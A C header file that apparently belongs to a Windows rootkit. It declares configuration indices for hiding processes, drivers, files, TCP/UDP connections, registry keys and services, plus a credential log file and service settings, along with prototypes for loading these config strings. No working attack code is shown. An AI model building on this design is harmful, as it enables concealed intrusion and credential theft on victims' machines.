// standard includes 
#include <winsock2.h>
#include <windows.h>
#include <time.h>

// own includes
#include "ntdll.h"

// config variables index
enum 
{
	ConfigRootProcess = 1,
	ConfigHiddenProcess,
	ConfigHiddenDriver,
	ConfigHiddenFileDir,
	ConfigHiddenTcpLocal,
	ConfigHiddenTcpRemote,
	ConfigHiddenUdp,
	ConfigHiddenRegKey,
	ConfigHiddenRegKeyValue,
	ConfigHiddenService,
	ConfigHdSpaceRegKey,
	ConfigCredLogFile,
	ConfigRunAsService,
	ConfigServiceName,
	ConfigServiceDisplayName,
	ConfigServiceDescription,
	ConfigCmdName,
};

// delimiter used in config strings
#define CONFIG_DELIMITER ';'

#ifndef __CONFIG__
#define __CONFIG__

PWCHAR config_LoadStringTable(HMODULE,DWORD);
PWCHAR config_GetResourceStringData(HMODULE,DWORD);
BOOL config_GetAnsiString(HMODULE,DWORD,PANSI_STRING);
INT config_GetInt(HMODULE,DWORD);
BOOL config_CheckString(INT,LPSTR,DWORD);
BOOL config_CheckInt(INT,UINT);
BOOL config_GetOneStringW(DWORD,DWORD,PUNICODE_STRING);
BOOL config_GetOneStringA(DWORD,DWORD,PANSI_STRING);

#endif